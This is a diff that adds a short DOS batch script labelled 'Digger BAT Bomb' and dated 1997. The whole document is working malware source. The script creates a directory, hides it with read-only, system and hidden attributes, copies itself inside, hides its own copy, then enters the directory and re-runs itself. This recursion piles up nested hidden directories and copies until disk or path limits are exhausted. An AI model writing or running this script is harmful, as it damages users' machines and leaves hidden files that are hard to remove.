@@ -1,0 +1,14 @@
+@echo off
+rem Digger BAT Bomb (C) AtH//HPG,8Nov97
+set ME=%0
+if not exist %0 set ME=%0.bat
+set DIR=%1
+if %1v==-vv set DIR=%2
+if %DIR%.==. set DIR=TEMP
+md %DIR%
+attrib +r +s +h %DIR%
+cd %DIR%
+copy..\%ME%>nul
+attrib +r +s +h ..\%ME%
+if %1v==-vv cd 
+%0 %1 %2
